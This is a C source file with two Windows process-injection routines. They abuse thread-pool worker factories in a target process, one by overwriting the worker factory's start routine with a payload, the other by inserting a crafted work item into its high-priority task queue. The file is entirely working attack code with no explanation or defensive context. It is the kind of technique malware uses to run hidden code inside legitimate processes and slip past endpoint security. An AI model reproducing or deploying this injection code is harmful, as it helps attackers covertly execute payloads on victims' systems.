#include "structs.h"
#include "typedefs.h"
#include "common.h"

BOOL InjectViaWorkerFactoryStartRoutine(HANDLE targetProcess, HANDLE hWorkerFactory, PVOID localPayloadAddress, size_t payloadSize) {

	NTSTATUS status = ERROR_SUCCESS;
	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
	uint32_t oldProtect = 0;
	uint32_t threadMinimumCount = 0;

	fnNtSetInformationWorkerFactory pNtSetInformationWorkerFactory = NULL;
	fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = NULL;

	pNtQueryInformationWorkerFactory = (fnNtQueryInformationWorkerFactory)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationWorkerFactory"));

	pNtSetInformationWorkerFactory = (fnNtSetInformationWorkerFactory)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetInformationWorkerFactory"));

	if (pNtSetInformationWorkerFactory == NULL || pNtQueryInformationWorkerFactory == NULL) {
		return FALSE;
	}

	status = pNtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL);

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	if (!VirtualProtectEx(targetProcess, workerFactoryInfo.StartRoutine, payloadSize, PAGE_READWRITE, (PDWORD)&oldProtect)) {
		return FALSE;
	}

	if (!WriteProcessMemory(targetProcess, workerFactoryInfo.StartRoutine, localPayloadAddress, payloadSize, NULL)) {
		return FALSE;
	}

	if (!VirtualProtectEx(targetProcess, workerFactoryInfo.StartRoutine, payloadSize, oldProtect, (PDWORD)&oldProtect)) {
		return FALSE;
	}

	threadMinimumCount = workerFactoryInfo.TotalWorkerCount + 1;

	status = pNtSetInformationWorkerFactory(hWorkerFactory, WorkerFactoryThreadMinimum, &threadMinimumCount, sizeof(uint32_t));

	if (status != ERROR_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}

BOOL InjectViaTpWork(_In_ HANDLE targetProcess, _In_ PVOID payloadAddress, _In_ HANDLE hWorkerFactory) {

	PFULL_TP_POOL pFullTpPoolBuffer = NULL;
	fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = NULL;
	size_t bytesRead = 0;
	WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
	LIST_ENTRY* taskQueueHighPriorityList = NULL;
	PFULL_TP_WORK pFullTpWork = NULL;
	PFULL_TP_WORK pRemoteFullTpWork = NULL;
	LIST_ENTRY* pRemoteWorkItemTaskNode = NULL;

	NTSTATUS status = 0x00;
	BOOL state = TRUE;

	pNtQueryInformationWorkerFactory = (fnNtQueryInformationWorkerFactory)(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationWorkerFactory"));

	if (pNtQueryInformationWorkerFactory == NULL) {
		return FALSE;
	}

	pFullTpWork = (PFULL_TP_WORK)(CreateThreadpoolWork((PTP_WORK_CALLBACK)payloadAddress, NULL, NULL));

	if (pFullTpWork == NULL) {
		return FALSE;
	}

	status = pNtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &workerFactoryInfo, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL);

	if (status != ERROR_SUCCESS) {
		state = FALSE;
		goto FUNC_CLEANUP;
	}

	pFullTpPoolBuffer = (PFULL_TP_POOL)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FULL_TP_POOL)));

	if (pFullTpPoolBuffer == NULL) {
		state = FALSE;
		goto FUNC_CLEANUP;
	}

	if (!ReadProcessMemory(targetProcess, workerFactoryInfo.StartParameter, pFullTpPoolBuffer, sizeof(FULL_TP_POOL), &bytesRead)) {
		state = FALSE;
		goto FUNC_CLEANUP;
	}

	taskQueueHighPriorityList = &pFullTpPoolBuffer->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	pFullTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)(workerFactoryInfo.StartParameter);
	pFullTpWork->Task.ListEntry.Flink = taskQueueHighPriorityList;
	pFullTpWork->Task.ListEntry.Blink = taskQueueHighPriorityList;
	pFullTpWork->WorkState.Exchange = 0x2;

	pRemoteFullTpWork = (PFULL_TP_WORK)(VirtualAllocEx(targetProcess, NULL, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (pRemoteFullTpWork == NULL) {
		state = FALSE;
		goto FUNC_CLEANUP;
	}

	if (!WriteProcessMemory(targetProcess, pRemoteFullTpWork, pFullTpWork, sizeof(FULL_TP_WORK), NULL)) {
		state = FALSE;
		goto FUNC_CLEANUP;
	}

	pRemoteWorkItemTaskNode = &pRemoteFullTpWork->Task.ListEntry;

	if (!WriteProcessMemory(targetProcess, &pFullTpPoolBuffer->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &pRemoteWorkItemTaskNode, sizeof(pRemoteWorkItemTaskNode), NULL)) {
		state = FALSE;
		goto FUNC_CLEANUP;
	}

	if (!WriteProcessMemory(targetProcess, &pFullTpPoolBuffer->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &pRemoteWorkItemTaskNode, sizeof(pRemoteWorkItemTaskNode), NULL)) {
		state = FALSE;
	}

FUNC_CLEANUP:

	if (pFullTpPoolBuffer) {
		HeapFree(GetProcessHeap(), 0, pFullTpPoolBuffer);
	}

	return state;
}
